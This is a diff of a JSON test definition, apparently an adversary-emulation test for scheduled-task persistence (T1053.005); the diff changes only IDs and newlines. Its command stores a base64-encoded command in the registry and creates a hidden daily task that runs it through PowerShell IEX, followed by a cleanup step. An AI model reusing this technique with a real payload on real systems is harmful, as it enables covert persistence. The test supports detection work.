@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "11cb7762-bb4d-4c50-a91e-20f38d81e6e6",
+      "id": "e88b1ba7-b779-4f6c-ae02-7e272b819298",
       "type": "execute-command",
       "data": {
-        "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n",
+        "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "8e63c538-3c21-4bde-a727-32be48011e1f",
+      "id": "9225c64b-4cc4-4ead-87fc-7d7fb9c6c111",
       "type": "execute-command",
       "data": {
-        "command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F \u003enul 2\u003e\u00261\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F \u003enul 2\u003e\u00261\n",
+        "command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F \u003enul 2\u003e\u00261\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F \u003enul 2\u003e\u00261",
         "command_type": "command_prompt"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "11cb7762-bb4d-4c50-a91e-20f38d81e6e6",
+      "s": "e88b1ba7-b779-4f6c-ae02-7e272b819298",
       "p": "on-success",
-      "o": "8e63c538-3c21-4bde-a727-32be48011e1f"
+      "o": "9225c64b-4cc4-4ead-87fc-7d7fb9c6c111"
     },
     {
-      "s": "11cb7762-bb4d-4c50-a91e-20f38d81e6e6",
+      "s": "e88b1ba7-b779-4f6c-ae02-7e272b819298",
       "p": "on-failure",
-      "o": "8e63c538-3c21-4bde-a727-32be48011e1f"
+      "o": "9225c64b-4cc4-4ead-87fc-7d7fb9c6c111"
     }
   ],
   "tags": [
